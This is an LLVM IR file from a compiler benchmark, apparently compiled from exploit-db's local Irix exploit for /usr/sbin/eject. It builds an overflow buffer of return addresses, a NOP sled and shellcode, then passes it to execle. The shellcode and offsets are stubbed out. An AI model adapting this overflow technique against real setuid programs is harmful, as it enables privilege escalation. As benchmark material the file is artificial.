; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/irix/local/extr_19276.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/irix/local/extr_19276.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@irix_shellcode = common dso_local global i32* null, align 8
@get_sp_code = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [34 x i8] c"Recompile with the '-n32' option\0A\00", align 1
@buf = common dso_local global i64 0, align 8
@OFFSET = common dso_local global i32 0, align 4
@GP_OFFSET = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [40 x i8] c"Sorry - this exploit for Irix 6.x only\0A\00", align 1
@NUM_ADDRESSES = common dso_local global i32 0, align 4
@BUF_LENGTH = common dso_local global i32 0, align 4
@IRIX_NOP = common dso_local global i32 0, align 4
@EXTRA = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [32 x i8] c"stack = 0x%x, targ_addr = 0x%x\0A\00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c"/usr/sbin/eject\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"eject\00", align 1
@.str.5 = private unnamed_addr constant [13 x i8] c"execl failed\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca [1 x i8*], align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32 ()*, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %12 = bitcast [1 x i8*]* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %12, i8 0, i64 8, i1 false)
  %13 = load i32*, i32** @irix_shellcode, align 8
  %14 = bitcast i32* %13 to i8*
  %15 = call i32 @strlen(i8* %14)
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %10, align 4
  %17 = load i32, i32* @get_sp_code, align 4
  %18 = sext i32 %17 to i64
  %19 = inttoptr i64 %18 to i32 ()*
  store i32 ()* %19, i32 ()** %11, align 8
  %20 = load i32 ()*, i32 ()** %11, align 8
  %21 = call i32 %20()
  store i32 %21, i32* %7, align 4
  %22 = load i32, i32* %7, align 4
  %23 = and i32 %22, -2147483648
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %28

25:                                               ; preds = %2
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i64 0, i64 0))
  %27 = call i32 @exit(i32 1) #4
  unreachable

28:                                               ; preds = %2
  %29 = load i64, i64* @buf, align 8
  %30 = inttoptr i64 %29 to i32*
  store i32* %30, i32** %8, align 8
  %31 = load i32, i32* %7, align 4
  %32 = load i32, i32* @OFFSET, align 4
  %33 = add nsw i32 %31, %32
  store i32 %33, i32* %6, align 4
  %34 = load i32, i32* %3, align 4
  %35 = icmp sgt i32 %34, 1
  br i1 %35, label %36, label %44

36:                                               ; preds = %28
  %37 = load i8**, i8*** %4, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 1
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @atoi(i8* %39)
  %41 = mul nsw i32 %40, 4
  %42 = load i32, i32* %6, align 4
  %43 = add nsw i32 %42, %41
  store i32 %43, i32* %6, align 4
  br label %44

44:                                               ; preds = %36, %28
  %45 = load i32, i32* %6, align 4
  %46 = load i32, i32* @GP_OFFSET, align 4
  %47 = add nsw i32 %45, %46
  %48 = icmp ugt i32 %47, -2147483648
  br i1 %48, label %49, label %52

49:                                               ; preds = %44
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.1, i64 0, i64 0))
  %51 = call i32 @exit(i32 1) #4
  unreachable

52:                                               ; preds = %44
  br label %53

53:                                               ; preds = %71, %52
  %54 = load i32, i32* %6, align 4
  %55 = and i32 %54, -16777216
  %56 = icmp eq i32 %55, 0
  br i1 %56, label %69, label %57

57:                                               ; preds = %53
  %58 = load i32, i32* %6, align 4
  %59 = and i32 %58, 16711680
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %69, label %61

61:                                               ; preds = %57
  %62 = load i32, i32* %6, align 4
  %63 = and i32 %62, 65280
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %69, label %65

65:                                               ; preds = %61
  %66 = load i32, i32* %6, align 4
  %67 = and i32 %66, 255
  %68 = icmp eq i32 %67, 0
  br label %69

69:                                               ; preds = %65, %61, %57, %53
  %70 = phi i1 [ true, %61 ], [ true, %57 ], [ true, %53 ], [ %68, %65 ]
  br i1 %70, label %71, label %74

71:                                               ; preds = %69
  %72 = load i32, i32* %6, align 4
  %73 = add nsw i32 %72, 4
  store i32 %73, i32* %6, align 4
  br label %53

74:                                               ; preds = %69
  store i32 0, i32* %9, align 4
  br label %75

75:                                               ; preds = %89, %74
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = load i32, i32* @NUM_ADDRESSES, align 4
  %79 = sext i32 %78 to i64
  %80 = udiv i64 %79, 4
  %81 = icmp ult i64 %77, %80
  br i1 %81, label %82, label %92

82:                                               ; preds = %75
  %83 = load i32, i32* %6, align 4
  %84 = load i32, i32* @NUM_ADDRESSES, align 4
  %85 = sdiv i32 %84, 2
  %86 = add nsw i32 %83, %85
  %87 = load i32*, i32** %8, align 8
  %88 = getelementptr inbounds i32, i32* %87, i32 1
  store i32* %88, i32** %8, align 8
  store i32 %86, i32* %87, align 4
  br label %89

89:                                               ; preds = %82
  %90 = load i32, i32* %9, align 4
  %91 = add nsw i32 %90, 1
  store i32 %91, i32* %9, align 4
  br label %75

92:                                               ; preds = %75
  store i32 0, i32* %9, align 4
  br label %93

93:                                               ; preds = %106, %92
  %94 = load i32, i32* %9, align 4
  %95 = sext i32 %94 to i64
  %96 = load i32, i32* @BUF_LENGTH, align 4
  %97 = load i32, i32* %10, align 4
  %98 = sub nsw i32 %96, %97
  %99 = sext i32 %98 to i64
  %100 = udiv i64 %99, 4
  %101 = icmp ult i64 %95, %100
  br i1 %101, label %102, label %109

102:                                              ; preds = %93
  %103 = load i32, i32* @IRIX_NOP, align 4
  %104 = load i32*, i32** %8, align 8
  %105 = getelementptr inbounds i32, i32* %104, i32 1
  store i32* %105, i32** %8, align 8
  store i32 %103, i32* %104, align 4
  br label %106

106:                                              ; preds = %102
  %107 = load i32, i32* %9, align 4
  %108 = add nsw i32 %107, 1
  store i32 %108, i32* %9, align 4
  br label %93

109:                                              ; preds = %93
  store i32 0, i32* %9, align 4
  br label %110

110:                                              ; preds = %125, %109
  %111 = load i32, i32* %9, align 4
  %112 = sext i32 %111 to i64
  %113 = load i32, i32* %10, align 4
  %114 = sext i32 %113 to i64
  %115 = udiv i64 %114, 4
  %116 = icmp ult i64 %112, %115
  br i1 %116, label %117, label %128

117:                                              ; preds = %110
  %118 = load i32*, i32** @irix_shellcode, align 8
  %119 = load i32, i32* %9, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i32, i32* %118, i64 %120
  %122 = load i32, i32* %121, align 4
  %123 = load i32*, i32** %8, align 8
  %124 = getelementptr inbounds i32, i32* %123, i32 1
  store i32* %124, i32** %8, align 8
  store i32 %122, i32* %123, align 4
  br label %125

125:                                              ; preds = %117
  %126 = load i32, i32* %9, align 4
  %127 = add nsw i32 %126, 1
  store i32 %127, i32* %9, align 4
  br label %110

128:                                              ; preds = %110
  store i32 0, i32* %9, align 4
  br label %129

129:                                              ; preds = %142, %128
  %130 = load i32, i32* %9, align 4
  %131 = sext i32 %130 to i64
  %132 = load i32, i32* @EXTRA, align 4
  %133 = sext i32 %132 to i64
  %134 = udiv i64 %133, 4
  %135 = icmp ult i64 %131, %134
  br i1 %135, label %136, label %145

136:                                              ; preds = %129
  %137 = load i32, i32* %6, align 4
  %138 = load i32, i32* @GP_OFFSET, align 4
  %139 = add nsw i32 %137, %138
  %140 = load i32*, i32** %8, align 8
  %141 = getelementptr inbounds i32, i32* %140, i32 1
  store i32* %141, i32** %8, align 8
  store i32 %139, i32* %140, align 4
  br label %142

142:                                              ; preds = %136
  %143 = load i32, i32* %9, align 4
  %144 = add nsw i32 %143, 1
  store i32 %144, i32* %9, align 4
  br label %129

145:                                              ; preds = %129
  %146 = load i32*, i32** %8, align 8
  store i32 0, i32* %146, align 4
  %147 = load i32, i32* %7, align 4
  %148 = load i32, i32* %6, align 4
  %149 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.2, i64 0, i64 0), i32 %147, i32 %148)
  %150 = load i64, i64* @buf, align 8
  %151 = getelementptr inbounds [1 x i8*], [1 x i8*]* %5, i64 0, i64 0
  %152 = call i32 @execle(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0), i64 %150, i32 0, i8** %151)
  %153 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.5, i64 0, i64 0))
  ret void
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @execle(i8*, i8*, i64, i32, i8**) #2

declare dso_local i32 @perror(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
